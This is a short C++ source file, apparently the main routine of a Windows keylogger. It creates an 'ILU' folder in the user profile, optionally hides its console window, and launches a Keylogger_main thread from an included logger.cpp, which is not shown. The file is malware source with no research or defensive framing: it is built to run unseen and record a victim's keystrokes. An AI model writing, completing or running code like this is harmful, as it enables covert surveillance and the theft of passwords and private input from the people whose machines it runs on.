#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include "logger.cpp"

int main() {
    setlocale(LC_ALL, "Russian");

    const char* userProfilePath = std::getenv("USERPROFILE");
    char dirPath[MAX_PATH] = {0};
    snprintf(dirPath, MAX_PATH, "%s\\ILU", userProfilePath);

    DWORD ftyp = GetFileAttributesA(dirPath);
    if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        if (!CreateDirectoryA(dirPath, NULL)) {
            std::cerr << "Error: " << dirPath << std::endl;
            return 1;
        }
    }

    if (hideWindow == true) {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    HANDLE hThread1 = CreateThread(NULL, 0, Keylogger_main, NULL, 0, NULL);
    WaitForSingleObject(hThread1, INFINITE);
    return 0;
}
